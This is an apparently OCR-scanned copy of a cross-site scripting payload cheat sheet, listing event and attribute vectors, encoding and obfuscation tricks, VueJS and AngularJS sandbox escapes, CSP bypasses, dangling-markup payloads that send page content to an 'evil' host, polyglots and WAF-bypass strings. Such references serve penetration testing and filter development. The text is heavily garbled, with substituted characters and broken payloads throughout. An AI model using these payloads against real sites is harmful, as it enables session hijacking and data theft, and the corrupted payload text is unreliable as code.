<svg><a ' avascript:alert (1) x—
```

"20" ' Copy Link

SVG animate tag using values &lt; svg&gt;&lt;animate attributeName—href values—j avascript : alert (1) /&gt;&lt;a id=xss&gt;<text x—20

Copy Link

SVG animate tag using to to—I />&lt;a id=xss&gt;<text x=20

```text
<svg><animate attributeName=href
```

from=j avascript : alert (1)

Copy Link

SVG set tag < attrLbuteName=href x=20 Copy Link

Data protocol inside script src

```text
<scrxpt src—"data:text/javascript,alert (1) '
```

' >&lt;/script&gt; Copy Link

SVG script href attribute without closing script tag

---

Copy Link

Import statement with data URL

&lt; script&gt;import ( data : text/ j avascript, alert (1) ) &lt; / script &gt;

Copy Link

MathML makes any tag clickable

(1) ">blah

Copy Link

Button and formaction

&lt; form&gt;&lt;button (1) &gt;XSS

Copy Link

Input and formaction

< type submit formaction=i avascr±pt : alert (1)

Copy Link

Form and action

< form action=j avascript : alert (1) type—submit

Copy Link

Animate tag with keytimes and multiple values

```text
<svg><animate attributeName—href dur—5s repeatCount—indefinite key
```

values—"https://portswigger . alert (1) & semi; C" /><a x—20

Copy Link

Embed supports code attribute

```text
<embed code=https://port swigger labs . net width=500 height=500
```

Copy Link

---

Object tag supports param url

&lt;0bject width—500 height—500 type—text/html&gt;&lt;param name—url value—https://portswigger labs . net&gt;

Copy Link

Object tag supports param code

```text
<obiect width—500 height—500 type text/ name code value—https://portswigger labs . net >
```

Copy Link

Object tag supports param movie

```text
<obiect width=500 height —500 type—text/ name=movie value=https://portswigger labs . net >
```

Copy Link

Object tag supports param src

&lt;0bject width—500 height=500 name—src value—https://portswigger labs. net &gt;

copy Link

Other useful attributes

Using srcdoc attribute

< i frame src—l onerror=alert (1)

Copy Link

Using srcdoc with entities

&lt; i frame Img src=l anerror=alert (I) &amp;gt; iframe&gt;

Copy Link

Click a submit element from anywhere on the page, even outside the form

&lt; form action—"javascript:alert (1) type submit for x&gt;XSS&lt;/1abe1&gt;

Copy Link

Hidden inputs: Access key attributes can enable XSS on normally unexploitable elements

---

Copy Link

Link elements: Access key attributes can enable XSS on normally unexploitable elements &lt; link rel=" canonical" (1) " / &gt; (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)

Copy Link

Download attribute can save a copy of the current webpage

< a h download=" filename . html Copy Link

Disable referrer using referrerpolicy &lt; img referrerpolicy="no-referrer" " // port swigger labs . net" &gt;

Copy Link

Set window.name via parameter on the window.open function < a onclick 'I window . open ( 'h t tp: // subdomain 1 . port swigger—labs . net/xss/xss .php? context—js string ; eval (name) // ' , 'alert Copy Link

Set window.name via name attribute in a &lt;iframe&gt; tag &lt; i frame (1) " . net/xss/xss string ; eval (name) &lt; / ifr ame&gt;

Copy Link

Set window.name via target attribute in a &lt;base&gt; tag

```text
<base targets" alert (1) "><a href "http://subdomain1 . port swigger labs. net/xss/xss .php?
```

context=js string ; eval (name) //">XSS v 1 a target in base tag&lt;/a&gt;

Copy Link

Set window.name via target attribute in a &lt;a&gt; tag

```text
<a target—"alert (1) " href—"http: // subdomainl . port swigger labs. net/xss/xss .php?
```

context—js string ; eval (name) //">XSS v 1 a target in a tag&lt;/a&gt;

---

Link

Set window.name via usemap attribute in a &lt;img&gt; tag

< img src 'Ivalidimage .png" shape—'l rect't 82, 126" (1) " href—"http://subdomainl . port swigger—labs . net/xss/xss .php? context—js string ; eval (name) Copy Link

Set window.name via target attribute in a &lt;form&gt; tag &lt; form action—"http://subdomainl.portswigger—labs . net/xss/xss.php" (1) type hidden name=x value="' ; eval (name) //"&gt;&lt;input type=hldden name=context value=js string v target in a forrn&gt; Copy Link

Set window.name via formtarget attribute in a &lt;input&gt; tag type submit &lt; form&gt;&lt;input type—hidden name—x value—" ' ;eval (name) //"&gt;&lt;input type—hidden name—context value—js string single&gt;&lt; type "submit" formaction—"http: // subdoma ' n 1 . port swigger—labs.net/xss/xss . php" (1) value "XSS formtarget in input type submit form&gt; Copy Link

Set window.name via formtarget attribute in a &lt;input&gt; tag type image &lt; form&gt;&lt;input type=hidden name=x value=" ' ; eval (name) //"&gt;<input type=hidden name=context value=js string name—I type " image" . png " formacti on—"http : / / subdomain 1 . port swigger— labs . net/xss/ xss . php " formtarget=" alert (1) " via formtarget in input type

Copy Link

Special tags

Redirect to a different domain

```text
<meta http—equiv="refresh "
```

content url=/ / port swigger—labs . net

Copy Link

Meta charset attribute UTF-7

```text
<rneta 7" / > +ADw script+AD4—a1ert (1) +ADw / script+AD4
```

Copy Link

---

```text
<meta http—eguiv—
```

content—t' text/htmL; / > (1) +ADw—/script+AD4— Copy Link

UTF-7 BOM characters (Has to be at the start of the document) 1 +/v8 +ADw script+AD4 alert (1) +ADw / script+AD4 Copy Link

UTF•7 BOM characters (Has to be at the start of the document) 2 + / v 9 (1) +ADw—/script+AD4— Copy Link

UTF-7 BOM characters (Has to be at the start of the document) 3 4/v+ (1) +ADw—/script+AD4—

Copy Link

UTF-7 BOM characters (Has to be at the start of the document) 4 + / v/ +ADw script+AD4 alert (1) +ADw / script+AD4 Copy Link

Upgrade insecure requests

```text
<rneta http Security Policy"
```

conten t— upgrade—insecure —requests > Copy Link

Disable JavaScript via iframe sandbox &lt; i frame sandbox src=" / / part swigger labs. net"&gt;&lt;/iframe&gt;

Copy Link

Disable referer referrer" > Copy Link

Encoding

---

Overlong UTF-8 (l)&lt;/script&gt; (l)&lt;/script&gt; (1) (T)&lt;/script&gt; Copy Link

Unicode escapes &lt; (T) &lt; / script &gt; Copy Link

Unicode escapes ES6 style

Copy Link

Unicode escapes ES6 style zero padded &lt; script &gt; Xu {0000000061 } 1 ert Copy Link

Hex encoding JavaScript escapes ( ' \ x 611 ert (1) Copy Link

Octal encoding

```text
<script>eval (' \ 1411ert (1) ')</script> < script>eval (' alert (\061) ')</script> ( 'alert (\61) ')</script>
```

Copy Link

Decimal encoding with optional semi-colon

```text
<a (1) ">XSS</a><a href
```

" (1) ">XSS&lt;/a&gt; Copy Link

SVG script with HTML encoding

---

Copy Link

Decimal encoding with padded zeros

Copy Link

Hex encoding entities

```text
<a avascript:alert (1)
```

">XSS&lt;/a&gt;

Copy Link

Hex encoding without semi-colon provided next character is not

```text
<a (1) ">XSS</a> <a avascript:alert (1) ">XSS</a> <a href="&#x6a
```

avascript : alert (1)

Copy Link

Hex encoding with padded zeros

< a avascript:alert (1)

Copy Link

Hex encoding is not case sensitive

```text
<a avascript:alert (1) ">XSS</a>
```

Copy Link

HTML entities

h ref "java script&colon; alert (1) h ref "java & Tab; scrupt:alert (1) script : alert (1) ">XSS&lt;/a&gt; &lt;a href—"javascript&amp;colon;alert&amp;lpar;l&amp;rpar; "&gt;XSS&lt;/a&gt;

Copy Link

URL encoding

'%27 alert

Copy

---

HTML entities and URL encoding

```text
<a spercnt;27-a1ert (1)-
```

Copy Link

Obfuscation

Data protocol inside script src with base64

&lt; scrxpt src=data: text/ javascript;base64, YWx1cnQoMSk—&gt;&lt;/script&gt;

Copy Link

Data protocol inside script src with base64 and HTML entities

```text
<scrxpt
```

&lt; / script &gt;

Copy Link

Data protocol inside script src with base64 and URL encoding

```text
<script src—data: text/ java script; base64,
```

Copy Link

'frame srcdoc HTML encoded

< i frame script&gt; alert&lpar; I&rpar; & It; &sol;

Copy Link

frame JavaScript URL with HTML and URL encoding

&lt; i f rame —"j avascript: &amp;#x25; &amp;#x33; &amp;#x43; ; &amp;#x69; &amp;#x74; &amp;#x25; &amp;#x33; &amp;#x45; &amp;#x61; &amp;#x6c; '#x7 src— 74; &amp;#x28; &amp;#x25; &amp;#x33; &amp;#x32; &amp;#x46; &amp;#x63; &amp;#x74; &amp;#x25; &lt; / ifr ame&gt;

Copy Link

SVG script with unicode escapes and HTML encoding

&lt; svg&gt;

---

Copy Link

Img tag with base64 encoding &lt; img src=x amF2YXNj cmLwdDphbGVydChkb2N1bVüVudC5kb21haW4p'&gt;

Copy Link

Client-side template injection

VueJS reflected

Version 2 Mario Heiderich (Cure53) 41 { {constructor . constructor( ' alert (1)

Copy Link

Version 2

Mario Heiderich (Cure53) & Sebastian Lekies (Google) & Eduardo Vela Nava (Google) & Krzysztof Kotowicz (Google) 62 . constructor . constructor ( 'alert (1) ') ( ) Copy Link

Version 2 Gareth Heyes (PortSwigger) 39 v-html— c. constructor('aLert (1) ' ) ( ) >

Copy Link

Version 2 Peter af Geijerstam (Swedish Shellcode Factory) 37 c. constructor alert (1)

Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 32

---

Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 32 { { v. constructor ('alert (1) ( ) Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 32 { { s. constructor ('alert (1) ') ( ) Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 39 c. constructor (1)

```text
<p v show
```

Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 52 < x v on: click=' b. constructors alert (1) Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 41 b. constructor' alert (1) Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 33 @ C b. constructors alert (1) Copy Link

---

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 33 .C b. constructor' alert (1) Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 33 c. constructor alert (1) Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 33 # C c. constructor'aLert (1) Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 32 c. constructors alert (I) Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 32 { { c. constructor ('alert (1) ') ( ) Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 30 { { b. constructor' alert (1) Copy Link

Version 2

---

40 "//14.rs" Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 27 is—scripL Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 48 b. constructoealert (1) Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 33

```text
<x @ ( b. constructoÜaLert (1)
```

Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 33 C b. constructors alert (1) Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 33 # C alert (1) Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 52 &lt; x title" &amp; It; iframe&amp;Tab; (1) &amp;gt; I' &gt;

---

Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 73 title" — & It; i frames Tab; onload&Tab;=setT1meout ( / alert (1) / . source) &gt; ">

Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 31

```text
<xyz<img/src onerror—alert (1)
```

Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 116 &lt; / noscript&amp;gt; &amp; It; iframe&amp;Tab; onload—setTimeout ( / alert (1) / . source) &amp;gt;&lt;/noscript&gt;&lt;/b&gt;< Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 59 c. constructor ( ' alert (1) Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 42 { {$el . ownerDocurnent . default-View . alert (1) } } Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 56 { {$el . innerHTML—t \u003cimg src onerror—alert (1) \uC03e' } }

Copy Link

---

Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 45 &lt; img src . pop ( ) .alert (1) &gt; Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 55 &lt; img src ( ) . pop ( ) . alert (1) &gt; Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 30 &lt; img src (1) &gt; Copy Link

Version 2 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 24 . alert (T) > Copy Link

Version 2 Davit Karapetyan (Independent consultant) 72 slot scope—") {}}]) *this . constructor. constructor ( ' alert (1) ' copy Link

Version 3 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 40 { {_openBIock.constructor( 'alert (1) ' ) ( ) Copy Link

Version 3 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant)

---

{ { createB10ck.constructor(' alert (1) ' ) ( ) } } Copy Link

Version 3 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 46 { { toDispTayString. constructor ('alert (T) ') ( ) } } Copy Link

Version 3 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 42 { { create V Node. constructor(' alert (1) ' ) ( ) } } Copy Link

Version 3 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 47

```text
<p v—show—
```

createB10ck. constructor alert (1) Copy Link

Version 3 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 41 < x @ C_openBIock. constructors alert (1) Copy Link

Version 3 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 42 < x @ capitalize. constructor' alert (1) Copy Link

Version 3 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 52 @click withCtx. constructo€ alert (1)

---

Link

Version 3 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 40 @click=$event.view.alert (1) Copy Link

Version 3 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 34 { { Vue. h. constructor' alert (1) Copy Link

Version 3 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 33 { {$emit. constructor alert (1) Copy Link

Version 3 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 85 < teleport to—script (2) Copy Link

Version 3 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 85 < teleport to—script : nth child (2) Copy Link

Version 3 Gareth Heyes (PortSwigger) & Lewis Ardern & PwnFunction (Independent consultant) 35

```text
<component is—script text—alert (1) >
```

Copy Link

---

I.O.I - 1.1.5

Mario Heiderich (Cure53) 41

{ {constructor . constructor( ' a Lert (1) '

Copy

Link

I.O.I - 1.1.5 (shorter)

Gareth Heyes (PortSwigger) & Lewis Ardern (Synopsys) 33

{ {$on.constructor ('alert (1) ') ( )

Copy Link

12.0-121

Jann Horn (Google)

122 { {a—' constructor' ; b— sub. call. call (b . getOwnPropertyDescr1ptor (b C a) . get PrototypeOf (a. sub) . value, 0, 'alert (1) '

copy

Link

1.2.2- 1.25

Gareth Heyes (PortSwigger) 23 . alert (1) // "0

Copy Link

1.2.6- 1.2.18

Jan Horn (Google) 106 . sub) . call. caLL ( { } [$ constructor ' ] . getOwnPropertyDe iptor (

- _proto

$ ) . value, O, 'alert (1) T) ( ) ) }

Copy

Link

---

Mathias Karlsson (Detectify) 124 { {toString . constructor . prototype . toString—toString . constructor . prototype . call ; ["a" 'alert (1) " . sort (toString. constructor) ; } }

Copy Link

1.2.24 - 1.2.29

Gareth Heyes (PortSwigger) 23

Copy Link

1.2.27-1.2.29/1 3.0-1 3.20

Gareth Heyes (PortSwigger) 23

- ) ; alert (1)

Copy Link

1 3.0

Gåbor Molnår (Google) 272 { { ! ready && (ready — true) & & ( ! call ? $$watchers . get (toString. constructor . prototype) (a apply) (app constructor) & & (valueOf — .toString( Function . prototype; call) + 'F. apply 'delete E. valueOf; + 'alert

Copy Link

133-13.18

Gareth Heyes (PortSwigger) 128

- [l .joxn,length.

. assign = [l • join;' prototype . charAt= ' —proto a . constructor . . join; $eval ( 'x—alert (1) // ' ) ,

Copy Link

1.3.19

Gareth Heyes (PortSwigger) 102 { { 'a' l{toString: false, valueOf: . join, length: 1, proto . charAt= [ ] . join; $eval ('x=alert (1) // '

Copy Link

---

Gareth Heyes (PortSwigger) 65 . join; $eval ('x=alert { { . constructor . prototype . charAt= C)

Copy Link

1.4.0- 1.4.9

Gareth Heyes (PortSwigger) 74 . join; $eval x=l} } ; alert (1)// { { 'a' . constructor . prototype . charAt= IJ

Copy Link

1.5.0-1.58

Ian Hickey & Gareth Heyes (PortSwigger) 79 •join;$eval ('x alert (1) . constructor . prototype} , . char-At

Copy Link

1.5.9- 1.5.11

Jann Horn (Google) 517 { { c=" . sub. . sub . bind; . sub. apply; $eval=b; op=$root. $$phase; $root. $$phase—null; od—$root.$digest; $raot.$digest— ( { Y) .toString; C—c. $apply (c) ; $ root. $$phase—op; $ root. $digest—o B=C (b, c, b) ; $eva1Async (" astNode=pop ( ) ; as t Node . type= 'UnaryExpress10n' ; as t Node . operator=' (window .X?v01d0 : (window. X true, alert (1) ) ) + ' ; as t Node . ' Identifier' , name: foo' } ; ml=B ($$asyncQueue . pop ( ) . expression, null, $root); m2=B (C, null, m 1) ; C] . push . . sub; $eval ('a (b. c) ' [ ] . push. apply—a; } }

Copy Link

1.5.9 - 1.5.11 shorter

Jann Horn (Google) & Lukasz Plonka 326 { {c=' . sub. . sub . bind; c . $app1y=$appLy ; c . $eval=b; $ root . $$phase=null ; $ root . $digest=$on; C—c. $apply (c) ; (b, c, b) ; $eva1Async ('tastNode=pop ( ) ; as t Node . type— 'UnaryExpression ' . operator 'alert (1) ' ; a e. type: ' Identifier' ; ") ;m1=$$asyncQueue . pop ( ) . expression;m2=B (C, null,ml) ; [ ] . push . apply=m2 ; $eval ( 'B (b)

Copy Link

Mario Heiderich (Cure53) 41 { {constructor . constructor( 'a Lert (1) ' ) ( ) } }

Copy

---

(shorter)

Gareth Heyes (PortSwigger) & Lewis Ardern (Synopsys) 33 {{$on.constructor('alert (1) ( )

Copy Link

## DOM based AngularJS sandbox escapes (Using orderBy or no $eval)

I.O.I -1.1 5

Mario Heiderich (Cure53) 37 constructor . constructor( 'alert (1) ') ( )

Copy Link

1.2.0- 1.2.18

Jann Horn (Google) 118 a—' constructor' ;b—{} ; a. sub . call. call (b [a] . getOwnPropertyDescriptor (b [a] . get PrototypeCf (a . sub) . value, 0, ' alert

Copy Link

1 2.19- 1.2.23

Mathias Karlsson (Detectify) 119 toString . constructor . prototype . toString—toString . constructor . prototype . call ; ["a" , "alert (1) 'I] . sort (taString. constructor)

Copy Link

1.2.24 - 1.2.26

Gareth Heyes (PortSwigger) 317 proto 'J] ] —constructor .getOwnPropertyDescriptor; g— proto proto . sub [ [ proto 'constructor'), proto [ ' z' ] —constructor . define Property, d proto . sub [ ' proto 'JJ, 'constructor' , {value: false}); proto 'J . value ('alert (1)

Copy Link

1.2.27-1.2.29/1.3.o-1.3.20

Gareth Heyes (PortSwigger) 20

---

Copy Link

1.4.0-1.4.5

Gareth Heyes (PortSwigger) 75 } ; alert (1)//'; . constructor . prototype . charAt= [l JON n, orderBy •

Copy Link

1 4.2-1 58

Gareth Heyes (PortSwigger) & Daniel Kachakil (Anvil Ventures) 70 {y. . constructor. prototype} . y. char . join; C 1 ) orderBy: ' x=alert (1)

Copy Link

.6.0

Mario Heiderich (Cure53) 37 constructor . constructor ( alert (1)

Copy Link

1.4.4 (without strings)

Gareth Heyes (PortSwigger) 134 Lost ring ( ) . constructor .proLoLype . . join; [1, 2] lorderBy: toString ( ) . constructor . fromCharCode (120, 61, 114,116, 40, 49, 41)

Copy Link

## AngularJS CSP bypasses

All versions (all browsers) using from

Gareth Heyes (PortSwigger) 91 &lt; input autofocus $event . composed Path ( ) orderBy: I J . constructor . from( 11] , alert) &gt;

Copy Link

All versions (all browsers) shorter using assignment

Gareth Heyes (PortSwigger) 66

---

Copy Link

All versions (all browsers) shorter

Gareth Heyes (PortSwigger) 91 < input autofocus ng focus=t' $event. composedPath ( ) order By: . constructor . from( [1] , alert)

Copy Link

1.2.0-1 5.0

Eduardo Vela (Google) 190

```text
<div ng—app ng—focus—" x=$event; "
```

id—f ng—repeat ' (key, value) in x. 'window' 1] . reduce (value. alert, 1) • ng Copy Link

All versions (all browsers) shorter via oncut

Savan Gadhiya (NotSoSecure) 59 < input ng cut=$event.composedPath ( ) orderBy: ' (y=alert) (1)

Copy Link

Scriptless attacks

## Dangling markup

Background attribute

```text
<body background—I' / / evil? < table background
```

" / / evil? &lt; background—" // evil? &lt; &lt; background="//evll? &lt;table&gt;&lt;td background="//evil? &lt; table&gt;<th background="//e

Copy Link

Link href stylesheet

< link rel=sLy1esheeL href—"//evil?

Copy Link

---

Link href icon

< link rel—icon Copy Link

Meta refresh

http://evil?

```text
<meta http equiv=" refresh"
```

Copy Link

Img to pass markup through src attribute

```text
<img src=" // evil? < image src='t // evil?
```

Copy Link

Video using track element < default src " // evil?

Copy Link

Video using source element and src attribute < src—" // evil?

Copy Link

Audio using source element and src attribute src " // evil?

Copy Link

Input src

---

Copy Link

Button using formaction < style "width: 100%; height : ICC*" type—submit formactxon " // evil? Copy Link

Input using formaction < type—submit value "XSS" style—'twidth ; height : ICC*" type—submit formaction " / / evil? Copy Link

Form using action // evil?

```text
<button form=x id—x action
```

Copy Link

Object data

```text
<obj ect data
```

/ /evil? Copy Link

frame src < i frame src / / evil? Copy Link

---

< embed src " / / evil? Copy Link

Use textarea to consume markup and post to external site < forrnaction—/ Copy Link

Pass markup data through window.name using form target

```text
<button id=x action=/ /ev1L target—'
```

Copy Link

Pass markup data through window.name using base target &lt; a . net/ dangling markup/ name . size=100 must clic me&lt;/font&gt;&lt;/a&gt;<base target—" Copy Link

Pass markup data through window.name using formtarget < type submit me" formaction=http://subdomain1 . port swigger— labs . net/ dangling markup/ name . html formtarget—"

Copy Link

Using base href to pass data < a href=abc font size: 1000px;' h ref = " // evil/

Copy Link

Using embed window name to pass data from the page

---

Copy Link

Using iframe window name to pass data from the page < i frame src—http: // subdomain 1 . port swigger—labs . net/ dangling markup/ name . html name Copy Link

Using object window name to pass data from the page

```text
<object data=http: // subdomain 1 . port swigger Labs . net/ dangling markup/ name . html name
```

Copy Link

Using frame window name to pass data from the page < src=http: // subdomaunl . port swigger—labs . net/ dangling markup/ name . html name Copy Link

Overwrite type attribute with image in hidden inputs < input type hidden type—image src " / / evil? Copy Link

Video element with poster attribute < video // evil? Copy Link

Polyglots

Polyglot payload 1 j avascript : / text / * / [ ] /+alert (1) // ' Copy

---

Polyglot payload 2

java script : "/*' / * ' / svg/*/onload alert ( ) // >

Copy Link

Polyglot payload 3

j avascript :

```text
<details/open/ontoggle— ' + / / + / " /+/onmouseover—l/+/ ( * / [1 /+alert (/@PortSwiggerRes/) / / '>
```

Copy Link

WAF bypass global objects

XSS into a JavaScript string: string concatenation (window)

' ; window [ 'ale '+' rt'] (window C ' doc'+'ument'] C' dom '+' azn J)

Copy Link

XSS into a JavaScript string: string concatenation (self)

' ; self['ale'+'rtt] (self ['doc'+'ument') a in

Copy Link

XSS into a JavaScript string: string concatenation (this)

' ; this I ' ale '+' r t'] (this L t doc'+'ument') ['dom '+' a in

Copy Link

XSS into a JavaScript string: string concatenation (top)

; top [ ale (top C ' doc'+'ument'] ['dom '+' ain']),

Copy Link

---

r t'] (parent C dom, '+' a in 'l)

Copy Link

XSS into a JavaScript string: string concatenation (frames)

; frames [ 'ale '+1 r t'] (frames C 'dom '+' a in

Copy Link

XSS into a JavaScript string: string concatenation (globalThis)

' ; global This ale '+' r t'] (global This C' doc'+'ument'] ['dom'+'ain']),

Copy Link

XSS into a JavaScript string: comment syntax (window)

' ; window [ / / ' alert ' / *bar* / ] ' document' / *bar* / ] C' domain'] )

Copy Link

XSS into a JavaScript string: comment syntax (self)

' ; self [ / / ' alert ' / *bar* / J (self C/ / ' document / *bar* / ) [ ' domain')),

Copy Link

XSS into a JavaScript string: comment syntax (this)

; this [ / / alert / *bark/ ) (this C/ document / *bark/ ) [ ' domain'] ) ,

Copy Link

XSS into a JavaScript string: comment syntax (top)

; top [ / / alert / *bark/ ] (tap C/ / document / kbar*/] [ domain

Copy Link

XSS into a JavaScript string: comment syntax (parent)

' ; parent [ / *foo* / ' alert ' / *bar*/] (parent [ / *foo* / 'document' / *bar* / ] ['domain'] ) ,

Copy

---

XSS into a JavaScript string: comment syntax (frames) ' ; frames / / ' alert ' / *bar* / ] (frames [ / / 'document' / *bar* / C' domain'] ) ' Copy Link

XSS into a JavaScript string: comment syntax (globalThis) ' ; global This [ / / ' alert ' / *bar*/] (global This C/ *foo* / 'document ' / *bar* / ] C ' domain ' ] ) , Copy Link

XSS into a JavaScript string: hex escape sequence (window) ; window [ \x61 ' ] (window ] [ ] ) ,

Copy Link

XSS into a JavaScript string: hex escape sequence (self) ; self [ ' (self C ' , Copy Link

XSS into a JavaScript string: hex escape sequence (this) ' [ ' ' (this C ' ' ] ' ) ; // Copy Link

XSS into a JavaScript string: hex escape sequence (top) ' ; top [ ' (top C ' ] ) , Copy Link

XSS into a JavaScript string: hex escape sequence (parent) ' ; parent [ ' ' ] (parent C ' [ '\x64\x6f\x6d\x61\x69\x6e']), Copy Link

XSS into a JavaScript string: hex escape sequence (frames) ' ; frames [ \x61 (frames I ' ' '\x64\x6f\x6d\x61\x69\x6e'J),

---

Link

XSS into a JavaScript string: hex escape sequence (globalThis) ; global This (global This [ ' ' Copy Link

XSS into a JavaScript string: hex escape sequence and base64 encoded string (window) ' ' \x6c'] ('window [ (window ("WENT") ) Copy Link

XSS into a JavaScript string: hex escape sequence and base64 encoded string (self) ' ; self [ ' ( ' self c ("WENT") ) Copy Link

XSS into a JavaScript string: hex escape sequence and base64 encoded string (this) ' ; this [ ' ( ' this (this ("WENT") ) Copy Link

XSS into a JavaScript string: hex escape sequence and base64 encoded string (top) ; top [ ( ' top ['I \ x 61 (top 'l ("WENT")) Copy Link

XSS into a JavaScript string: hex escape sequence and base64 encoded string (parent) ; parent [ \x6c'] ('parent (parent ("WENT") ) Copy Link

XSS into a JavaScript string: hex escape sequence and base64 encoded string (frames) ' ; frames [ ' \x6c' ] ( ' frames (frames ("WENT") ) Copy Link

---

; global This ( 'g Lobal This [ ( global This ("WFNT") ) ' ) Copy Link

XSS into a JavaScript string: octal escape sequence (window)

Copy Link

XSS into a JavaScript string: octal escape sequence (self) ' ; self Copy Link

XSS into a JavaScript string: octal escape sequence (this) ' ; this Copy Link

XSS into a JavaScript string: octal escape sequence (top)

Copy Link

XSS into a JavaScript string: octal escape sequence (parent)

Copy Link

XSS into a JavaScript string: octal escape sequence (frames) ' ; frames Copy Link

---

Copy Link

XSS into a JavaScript string: unicode escape (window)

Copy Link

XSS into a JavaScript string: unicode escape (self)

Copy Link

XSS into a JavaScript string: unicode escape (this)

Copy Link

XSS into a JavaScript string: unicode escape (top)

Copy Link

XSS into a JavaScript string: unicode escape (parent)

Copy Link

XSS into a JavaScript string: unicode escape (frames) ; frames [ 'J ' ) , Copy Link

XSS into a JavaScript string: unicode escape (globalThis)

Copy

---

XSS into a JavaScript string: RegExp source property (window) ' ; window / a 1/ . source+/ert/ . source] (/XSS/ . source) ; // Copy Link

XSS into a JavaScript string: RegExp source property (self) ' ; self [/al/ . source+/ert/ . source] (/XSS/ . source) ; // Copy Link

XSS into a JavaScript string: RegExp source property (this) ; this [/al/ . source+/ert/ . source] (/XSS/ . source) ; //

Copy Link

XSS into a JavaScript string: RegExp source property (top) ; top ( / a 1/ . source+/ert/ . source] (/XSS/ . source) ; // Copy Link

XSS into a JavaScript string: RegExp source property (parent) ; parent [ / a 1/ . source+/ert/ . source] (/XSS/ . source) ; // Copy Link

XSS into a JavaScript string: RegExp source property (frames) ' ; frames C/ a 1/ . source+/ert/ . source (/XSS/ . source) ; //

Copy Link

XSS into a JavaScript string: RegExp source property (globalThis) ' ; global This [/al/ . source+/ert/ . source) (/XSS/ . source) ; // Copy Link

XSS into a JavaScript string: Hieroglyphy/JSFuck (window)

---

Copy Link

XSS into a JavaScript string: Hieroglyphy/JSFuck (self) ' (+0+1]) ! [ 1+1] ) ! ! !

Copy Link

XSS into a JavaScript string: Hieroglyphy/JSFuck (this)

Copy Link

XSS into a JavaScript string: Hieroglyphy/JSFuck (top) ; top [ ] ) [ + +11) l)

Copy Link

XSS into a JavaScript string: Hieroglyphy/JSFuck (parent)

copy Link

XSS into a JavaScript string: Hieroglyphy/JSFuck (frames)

Copy Link

XSS into a JavaScript string: Hieroglyphy/JSFuck (globalThis)

Copy Link

Content types

---

